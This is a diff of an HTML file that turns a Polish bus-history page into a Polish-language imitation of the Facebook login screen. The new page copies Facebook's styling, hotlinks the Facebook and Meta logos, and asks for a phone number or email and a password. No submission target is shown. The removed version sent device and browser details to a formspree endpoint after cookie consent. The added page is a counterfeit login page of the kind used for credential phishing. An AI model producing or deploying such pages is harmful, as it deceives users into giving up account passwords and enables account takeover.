@@ -3,155 +3,214 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Historia Autobusów</title>
+    <title>Logowanie</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
+            background: linear-gradient(90deg, rgba(255, 0, 0, 0.05), rgba(0, 255, 0, 0.05));
             margin: 0;
-            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
         }
+
         .header {
-            background-color: #2d2d2d;
-            color: white;
-            text-align: center;
-            padding: 20px 0;
-        }
-        .content {
-            padding: 20px;
-        }
-        .bus-info {
-            background-color: white;
-            margin-bottom: 20px;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .bus-info img {
-            max-width: 100%;
-            border-radius: 8px;
-        }
-        .bus-info h2 {
-            color: #d32f2f;
-        }
-        .bus-info p {
-            font-size: 1.1em;
-        }
-        .footer {
-            background-color: #2d2d2d;
-            color: white;
-            text-align: center;
-            padding: 20px 0;
-        }
-        #cookie-banner {
-            position: fixed;
-            bottom: 0;
-            left: 0;
             width: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: white;
-            text-align: center;
-            padding: 10px;
-            display: none;
+            padding: 5px 0;
         }
-        #cookie-banner button {
-            background-color: #d32f2f;
+
+        .header h1 {
+            font-size: 12px;
+            color: #606770;
+            margin: 0;
+        }
+
+        .logo {
+            margin: 30px 0 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo img {
+            width: 65px;
+            height: 65px;
+        }
+
+        .login {
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .login input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+
+        .login button {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            font-size: 16px;
+            font-weight: bold;
             color: white;
+            background-color: #1877f2;
             border: none;
-            padding: 10px 20px;
+            border-radius: 20px;
             cursor: pointer;
-            font-size: 1em;
         }
-        #cookie-banner button:hover {
-            background-color: #c62828;
+
+        .login button:hover {
+            background-color: #145db2;
+        }
+
+        .login .forgot-password {
+            display: block;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #606770;
+            text-decoration: none;
+        }
+
+        .login .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .footer .create-account {
+            width: 100%;
+            max-width: 350px;
+            padding: 12px;
+            margin: 10px 0;
+            font-size: 14px;
+            font-weight: bold;
+            color: #1877f2;
+            background-color: transparent;
+            border: 2px solid #1877f2;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+
+        .footer .create-account:hover {
+            background-color: rgba(24, 119, 242, 0.1);
+        }
+
+        .footer img {
+            width: 63px;
+            margin: 15px 0;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: #606770;
+            margin: 0;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-top: 8px;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-5px);
+            }
+            50% {
+                transform: translateX(5px);
+            }
+            75% {
+                transform: translateX(-5px);
+            }
         }
     </style>
 </head>
 <body>
-
-    <div id="cookie-banner">
-        <p>Nasza strona zbiera dane o Twoim urządzeniu i przeglądarce w celu analizy ruchu i poprawy jakości usług. Prosimy o wyrażenie zgody na zbieranie tych informacji.</p>
-        <button id="accept-btn">Zaakceptuj</button>
-        <button id="decline-btn">Odrzuć</button>
-    </div>
-
     <div class="header">
-        <h1>Historia Autobusów</h1>
+        <h1>Polski</h1>
     </div>
 
-    <div class="content">
-        <div class="bus-info">
-            <h2>Volvo 8700</h2>
-            <img src="https://image.ceneostatic.pl/data/products/101874219/p-volvo-8700.jpg" alt="Volvo 8700">
-            <p>Volvo 8700 to nowoczesny autobus miejski, który wyróżnia się przestronnością i komfortem. Produkowany jest od 2001 roku, a jego unikalny design sprawia, że jest jednym z najczęściej spotykanych autobusów w miastach.</p>
-        </div>
+    <div class="logo">
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" alt="Facebook logo">
+    </div>
 
-        <div class="bus-info">
-            <h2>Solaris Urbino 12</h2>
-            <img src="https://samochody-specjalne.pl/wp-content/uploads/2021/03/5-solaris-urbino-12-electric_a2-678x381.jpg" alt="Solaris Urbino 12">
-            <p>Solaris Urbino 12 to jeden z najbardziej popularnych modeli autobusów miejskich w Polsce. Jego produkcja rozpoczęła się w 1999 roku, a model ten oferuje wyjątkowy komfort dla pasażerów i niską emisję spalin.</p>
-        </div>
-
-        <div class="bus-info">
-            <h2>MAN Lion's City</h2>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/MAN_Lion%27s_City_18_EfficientHybrid_795%2C_bus_line_107%2C_Szczecin%2C_2022.jpg/1200px-MAN_Lion%27s_City_18_EfficientHybrid_795%2C_bus_line_107%2C_Szczecin%2C_2022.jpg" alt="MAN Lion's City">
-            <p>MAN Lion's City to autobus, który wyróżnia się innowacyjnymi rozwiązaniami technologicznymi i ekologicznymi. Jest szeroko wykorzystywany w wielu miastach na całym świecie od 2001 roku.</p>
-        </div>
-
-        <div class="bus-info">
-            <h2>Mercedes-Benz Citaro</h2>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/77/Heidelberg_-_Mercedes-Benz_O_530_Citaro_-_LU-ET_690_-_2016-08-25_14-33-51.jpg" alt="Mercedes-Benz Citaro">
-            <p>Mercedes-Benz Citaro to jeden z liderów w kategorii autobusów miejskich. Produkowany od 1997 roku, charakteryzuje się wyjątkową trwałością i niską emisją spalin.</p>
-        </div>
-
-        <div class="bus-info">
-            <h2>Iveco Crossway</h2>
-            <img src="https://www.ivecobus.com/worldwide/-/media/IvecoBus/International/intercity/Crossway_p1.jpg?w=421&mw=421" alt="Iveco Crossway">
-            <p>Iveco Crossway to wyjątkowy autobus, który łączy nowoczesne technologie z tradycją. Produkowany od 2005 roku, jest często wykorzystywany w transportach międzymiastowych i turystycznych.</p>
-        </div>
+    <div class="login">
+        <form id="loginForm" onsubmit="return validateForm()">
+            <input type="text" id="emailPhone" name="emailPhone" placeholder="Numer telefonu komórkowego lub adres e-mail" autocomplete="on" required>
+            <input type="password" id="password" name="password" placeholder="Hasło" autocomplete="on" required>
+            <button type="submit">Zaloguj się</button>
+            <span class="error-message" id="error-message"></span>
+        </form>
+        <a href="#" class="forgot-password">Nie pamiętasz hasła?</a>
     </div>
 
     <div class="footer">
-        <p>&copy; 2024 Historia Autobusów. Wszelkie prawa zastrzeżone.</p>
+        <button class="create-account">Utwórz nowe konto</button>
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yr/r/7trPSpNFerC.png" alt="Meta logo">
+        <p>Informacje • Pomoc • Więcej</p>
     </div>
 
     <script>
-        document.getElementById("accept-btn").addEventListener("click", function() {
-            document.getElementById("cookie-banner").style.display = "none";
-            sendDeviceData();
-        });
+        function validateForm() {
+            const emailPhone = document.getElementById("emailPhone").value.trim();
+            const password = document.getElementById("password").value;
+            const errorMessage = document.getElementById("error-message");
 
-        document.getElementById("decline-btn").addEventListener("click", function() {
-            document.getElementById("cookie-banner").style.display = "none";
-        });
+            const phonePattern = /^\+[0-9]{2}[0-9]{9}$/; // Kod kierunkowy (np. +48) + 9 cyfr
+            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
 
-        function sendDeviceData() {
-            const deviceData = {
-                browser: navigator.userAgent,
-                deviceType: /mobile/i.test(navigator.userAgent) ? 'Mobilny' : 'Komputer',
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                dateTime: new Date().toLocaleString()
-            };
+            if (phonePattern.test(emailPhone)) {
+                // Numer telefonu jest poprawny
+            } else if (emailPattern.test(emailPhone)) {
+                // Adres e-mail jest poprawny
+            } else {
+                showError("Wprowadź poprawny numer telefonu z kodem kierunkowym lub adres e-mail.");
+                return false;
+            }
 
-            const formData = new FormData();
-            formData.append('browser', deviceData.browser);
-            formData.append('deviceType', deviceData.deviceType);
-            formData.append('screen', `${deviceData.screenWidth}x${deviceData.screenHeight}`);
-            formData.append('dateTime', deviceData.dateTime);
+            if (!password) {
+                showError("Hasło nie może być puste.");
+                return false;
+            }
 
-            fetch('https://formspree.io/f/mjkkrzqp', {
-                method: 'POST',
-                body: formData
-            });
+            errorMessage.style.display = "none";
+            return true;
         }
 
-        window.onload = function() {
-            document.getElementById("cookie-banner").style.display = "block";
-        };
-    </script>
+        function showError(message) {
+            const errorMessage = document.getElementById("error-message");
+            errorMessage.textContent = message;
+            errorMessage.style.display = "block";
+            errorMessage.style.opacity = "1";
 
+            // Ukryj błąd po 10 sekundach z efektem zanikania
+            setTimeout(() => {
+                errorMessage.style.opacity = "0";
+            }, 9000); // Zaczyna zanikać po 9 sekundach
+
+            setTimeout(() => {
+                errorMessage.style.display = "none";
+            }, 10000); // Całkowite ukrycie po 10 sekundach
+        }
+    </script>
 </body>
 </html>
